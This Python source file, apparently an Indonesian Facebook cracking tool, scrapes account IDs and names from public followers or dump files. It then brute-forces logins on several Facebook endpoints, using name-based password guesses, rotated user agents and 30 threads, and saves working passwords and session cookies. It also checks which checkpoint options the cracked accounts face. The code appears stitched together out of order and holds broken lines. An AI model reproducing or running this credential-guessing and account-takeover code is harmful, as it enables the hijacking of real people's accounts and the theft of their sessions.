			sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	exit(setting())
	
def crack_foll():
	akun = input(f'{garis} pastikan akun bersifat publik \n akun : ')
	try:
		bas = ses.get(f"https://graph.facebook.com/{akun}?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token={t}",cookies=c).json()
		for pi in bas["subscribers"]["data"]:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print(f'\r{garis} sedang dump %s id'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		setting()
	except (KeyError,IOError):
		exit(f"{garis}  akun tidak publik")


def file():
	tek = '# CEK OPSI DARI FILE'
	sol().print(mark(tek, style='white'), style='white')
	print(h+'['+h+'•'+h+'] Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	teks = '# PILIH FILE YG AKAN DI CEK'
	sol().print(mark(teks, style='white'))
	my_files = []
	try:
		lis = os.listdir('CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		yy = '# ANDA BELUM MEMILIKI RESULT UNTUK DICEK'
		sol().print(mark(yy, style='red'))
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
			except:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
		teks2 = '# PILIH FILE YG AKAN DI CEK'
		sol().print(mark(teks2, style='white'))
		geeh = input(h+'['+h+'f'+h+'] MENU: ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# PILIHAN TIDAK ADA DI MENU'
			sol().print(mark(ric, style='white'))
			exit()
		try:
			hf = open('CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='white'))
				time.sleep(2)
				back()

          

def crack_file():
	file = input(f' {garis} masukan nama file dump\n file : ')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:user,nama = data.split('|')
			except:exit(f" {garis} pemisah salah")
			dump.append(data)
			print('\r sedang dump %s id'%(len(dump)),end=" ")
			time.sleep(0.0000003)
	except FileNotFoundError:exit(f" {garis} file tidak ada")
	print(f'\r {garis} total jumlah akun adalah {len(dump)}')
	setting()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(Panel(f'{P2}[{H2}01{P2}] crack urutan new ({H2}public crack{P2})\n{P2}[{H2}02{P2}] crack urutan old ({H2}public crack{P2})\n{P2}[{H2}03{P2}] crack urutan random ({H2}public crack{P2})',title=' • Publick •', style=f"{warna_warni_rich}",width=80,padding=(0,4)))
	zprint(f'╭[ Pilih ]')
	hu = input(f'╰───▶ : ')
	if hu in ['2','02']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['1','01']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	elif hu in ['5','05']:
		for kont in id:
			id2.append(kont)
	elif hu in ['4','04']:
		for kont in id:
			id2.insert(0,kont)
	elif hu in ['6','06']:
		for kont in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,kont)
	else:
		print('>> input correctly ')
		exit()
		print('')
  #  urut = []
	cetak(Panel(f"{P2}[{H2}01{P2}] methode mobile ({H2}slowed cracked{P2})\n{P2}[{H2}02{P2}] methode free ({M2}not recommend {P2})\n{P2}[{H2}03{P2}] methode mbasic  ({H2} fast cracked{P2})",title=' • V1 • ', style=f"{warna_warni_rich}",width=80,padding=(0,4)))
	zprint(f'╭[ Pilih ]')
	hc = input(f'╰───▶: ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('mbasic')
	elif hc in ['3','03']:
		method.append('free')
	elif hc in ['4','04']:
		method.append('Mobile-v2')
	else:
		method.append('mobile')
	pwplus=input(f' [{b}?{x}] Add Password Manual ({h}y{x}/{m}t{x}) : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f' [{b}?{x}] Enter Additional Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	ua = input(f' [{b}?{x}] Use manual user agent ? ({h}y{x}/{m}t{x}) : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f' [{b}?{x}] Input your user agent : ');uadia.append(bz)
	else:uadarimu.append('uasc')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(panel(f'[bold white]Results [green]OK[white] Save in : [green]OK/%s [white]'%(okc),style=f"{warna_warni_rich}",width=80,padding=(0,4))) 
	cetak(panel(f'[bold white]Results [yellow]CP[white] Save in : [yellow]CP/%s [bold white]'%(cpc),style=f"{warna_warni_rich}",width=80,padding=(0,4))) 
	#cetak(panel(f'[bold white]ON/OFF MODE PESAWAT SETIAP 500/1K ID ',style=f"{warna_warni_rich}",width=80,padding=(0,4))) 
	print('')
	global prog,des
	prog = Progress(SpinnerColumn('monkey'),TextColumn('{task.description}'),BarColumn(bar_width=35),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = ['kontol','sayang','indonesia','kontol123','sayang123','indonesia123','anjing123','anjing']
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'12345')
						pwv.append(frs+'1234')
						pwv.append(frs+'321')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'12345')
						pwv.append(frs+'1234')
						pwv.append(frs+'321')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
					else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
			else:
					pool.submit(crackmbasic,idf,pwv)
		
		print('')
		cetak(panel(f'[bold green]Succesfully Crack,Dont Forget Send Your Feedback After Use My Script, Thanks You',width=80,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SUCCESFULY [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
		print('')
		print(f'{h} OK : {h}%s '%(ok))
		print(f'{k} CP : {k}%s{x} '%(cp))
		print('')
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'[{bo}{idf}{P}] [red]{(loop)}/[white]{len(id)}[/] [white][OK[/]:[green]{(ok)}{P}] [/]=[white] [CP[/]:[yellow]{(cp)}{P}]')
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree("")
				tree.add(f"{P2}account name : {K2}{idf}").add(f"{P2}password : {K2}{pw}{P2}")
				tree.add(f"{P2} Useragent").add(Panel(f"[purple]{ua}"))
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree("")
				tree.add(f"{hh}{idf} {P}| {hh}{pw}").add(Panel(f"[bold green]{kuki}"))
				prints(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ MBASIC
def crackfree(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":'free.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://free.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'free.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r └── Email  : {kk}{idf}{P}          \n│   └──  Sandi  : {kk}{pw}          {P}\n└── User Agent  : {kk}{ua}{P}           \n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r├── Email  : {hh}{idf}{P}          \n│   └──  sandi  : {hh}{pw}          {P}\n└──  Cookie : {hh}{kuki}{P}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				#os.popen('play-audio data/ok.mp3')
				#cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ METHODE-MBASIC ]-----------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r├── Email  : {kk}{idf}{P}|{kk}{pw}          {P}\n└── User Agent  : {kk}{ua}{P}           \n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r├── Email  : {hh}{idf}{P}|{hh}{pw}          {P}\n└──  Cookie : {hh}{kuki}{P}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				#os.popen('play-audio data/ok.mp3')
				#cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ OPSI CP-TAP YES ]----------------------#
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1

def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(Panel(hu, title='CEK OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = ses(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
